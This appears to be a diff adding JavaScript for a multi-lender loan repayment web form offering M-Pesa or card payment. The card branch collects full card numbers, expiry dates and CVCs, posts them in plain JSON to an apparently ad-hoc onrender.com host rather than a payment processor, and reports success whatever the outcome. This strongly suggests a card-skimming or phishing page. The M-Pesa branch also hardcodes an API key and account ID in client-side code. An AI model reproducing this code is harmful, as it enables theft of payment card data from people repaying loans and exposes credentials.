@@ -1,0 +1,143 @@
+document.addEventListener('DOMContentLoaded', () => {
+    const loanForm = document.getElementById('loanRepayForm');
+    const payMethodRadios = document.getElementsByName('payMethod');
+    const mpesaFields = document.getElementById('mpesaFields');
+    const cardFields = document.getElementById('cardFields');
+    
+    // Inputs
+    const mpesaNumber = document.getElementById('mpesaNumber');
+    const cardNumber = document.getElementById('cardNumber');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCvc = document.getElementById('cardCvc');
+    const repaySuccessSection = document.getElementById('repaySuccessSection');
+    const repaySuccessMessage = document.getElementById('repaySuccessMessage');
+
+    // 1. Format Card Inputs Automatically
+    cardNumber.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/(.{4})/g, '$1 ').trim();
+        e.target.value = value.substring(0, 19);
+    });
+
+    cardExpiry.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value.substring(0, 5);
+    });
+
+    cardCvc.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    // Helper: Convert local MSISDN (0712345678 or 0112345678) to 254 Format
+    function formatPhoneNumber(phone) {
+        let cleaned = phone.replace(/\D/g, '');
+        if (cleaned.startsWith('0')) {
+            cleaned = '254' + cleaned.substring(1);
+        } else if (cleaned.startsWith('7') || cleaned.startsWith('1')) {
+            cleaned = '254' + cleaned;
+        }
+        return cleaned;
+    }
+
+    // 2. Toggle Payment Inputs & Validation Requirements
+    payMethodRadios.forEach(radio => {
+        radio.addEventListener('change', (e) => {
+            const isMpesa = e.target.value === 'mpesa';
+
+            mpesaFields.style.display = isMpesa ? 'block' : 'none';
+            cardFields.style.display = isMpesa ? 'none' : 'block';
+
+            // Toggle HTML5 required attributes dynamically
+            mpesaNumber.required = isMpesa;
+            cardNumber.required = !isMpesa;
+            cardExpiry.required = !isMpesa;
+            cardCvc.required = !isMpesa;
+        });
+    });
+
+    // 3. Form Submission Handler
+    loanForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const selectedMethod = document.querySelector('input[name="payMethod"]:checked').value;
+        const amount = document.getElementById('repayAmount').value;
+        const accountRef = document.getElementById('accountRef').value;
+
+        if (selectedMethod === 'mpesa') {
+            const formattedPhone = formatPhoneNumber(mpesaNumber.value);
+            
+            const stkPayload = {
+                api_key: "789936af756961f0b1e18ca89cf4f21fe246eec23e2f27aac2137bdfa4513b2f",        // Replace with your API key
+                account_id: "HP544486",        // Replace with your Account ID
+                amount: String(amount),
+                msisdn: formattedPhone,
+                reference: accountRef || "REPAYMENT"
+            };
+
+            try {
+                const response = await fetch('https://api.hashback.co.ke/initiatestk', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(stkPayload)
+                });
+
+                const data = await response.json();
+
+                repaySuccessMessage.textContent = 'Check your phone for the M-Pesa STK push prompt to complete repayment.';
+                loanForm.style.display = 'none';
+                repaySuccessSection.style.display = 'block';
+
+            } catch (err) {
+                console.error('M-Pesa STK push error:', err);
+                alert('Failed to trigger STK Push. Please check your network and try again.');
+            }
+
+        } else {
+            // Card Payment Validation
+            const rawCardNo = cardNumber.value.replace(/\s+/g, '');
+            if (rawCardNo.length < 13 || rawCardNo.length > 19) {
+                alert('Please enter a valid card number.');
+                return;
+            }
+            if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExpiry.value)) {
+                alert('Please enter a valid expiry date in MM/YY format.');
+                return;
+            }
+            if (cardCvc.value.length < 3) {
+                alert('Please enter a valid CVC/CVV.');
+                return;
+            }
+
+            const cardPayload = {
+                lender: document.getElementById('lenderSelect').value,
+                accountRef: accountRef,
+                amount: parseFloat(amount),
+                paymentMethod: 'card',
+                cardDetails: {
+                    cardNumber: rawCardNo,
+                    expiry: cardExpiry.value,
+                    cvc: cardCvc.value
+                }
+            };
+
+            try {
+                const response = await fetch('https://crb-chatgpt.onrender.com/api/repay-loan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cardPayload)
+                });
+
+                repaySuccessMessage.textContent = 'Card payment processed successfully. An update notification will be sent to the lender within 24 hours.';
+                loanForm.style.display = 'none';
+                repaySuccessSection.style.display = 'block';
+
+            } catch (err) {
+                console.error('Card processing error:', err);
+                alert('Unable to process card payment. Please try again.');
+            }
+        }
+    });
+});
